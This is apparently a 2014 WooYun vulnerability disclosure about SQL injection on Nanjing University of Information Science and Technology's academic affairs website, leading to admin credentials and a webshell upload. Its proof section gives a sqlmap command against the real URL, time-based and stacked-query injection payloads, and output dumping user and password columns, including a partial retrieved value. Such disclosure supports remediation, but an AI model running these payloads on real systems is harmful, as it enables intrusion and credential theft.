wybug_title: 南京信息工程大学教务处网站可注射，后台上传木马可获取webshell
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-01：	细节已通知厂商并且等待厂商处理中									2014-07-04：	厂商已经确认，细节仅向厂商公开									2014-07-14：	细节向核心白帽子及相关领域专家公开									2014-07-24：	细节向普通白帽子公开									2014-08-03：	细节向实习白帽子公开									2014-08-15：	细节向公众公开  简要描述： 南京信息工程大学教务处网站可注射，获取到管理员密码进入后台可上传木马可获取webshell 详细说明：  南京信息工程大学教务处网站可注射，获取到管理员密码进入后台可上传木马可获取webshell   漏洞证明：  sqlmap暴库获取管理员密码：D:\Python27\sqlmap>sqlmap.py -u http://jwc.nuist.edu.cn/ShowNews.aspx?newsno=793 -D db_NXInfoEduOffice -T dbo.T_User -C "UserName,Pwd" --dump    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:23:07[11:23:07] [INFO] resuming back-end DBMS 'microsoft sql server'[11:23:08] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: newsno    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: newsno=793; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: newsno=793 WAITFOR DELAY '0:0:5'-----[11:23:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[11:23:08] [INFO] fetching columns 'Pwd, UserName' for table 'T_User' in database 'db_NXInfoEduOffice'[11:23:08] [INFO] resumed: 2[11:23:08] [WARNING] time-based comparison requires larger statistical model, please wait..............................[11:23:42] [CRITICAL] there is considerable lagging in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)sqlmap got a 302 redirect to 'http://jwc.nuist.edu.cn:80/GenericErrorPage.htm'.Do you want to follow? [Y/n][11:23:44] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[11:23:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[11:23:46] [INFO] retrieved:[11:23:47] [WARNING] unable to retrieve column names for table 'T_User' in database 'db_NXInfoEduOffice'[11:23:47] [INFO] fetching entries of column(s) 'Pwd, UserName' for table 'T_User' in database 'db_NXInfoEduOffice'[11:23:47] [INFO] fetching number of column(s) 'Pwd, UserName' entries for table 'T_User' in database 'db_NXInfoEduOffice'[11:23:47] [INFO] resumed: 3[11:23:47] [INFO] fetching number of distinct values for column 'Pwd'[11:23:47] [INFO] resumed: 3[11:23:47] [INFO] using column 'Pwd' as a pivot for retrieving row data[11:23:47] [INFO] resumed: ljw583[11:23:47] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602).
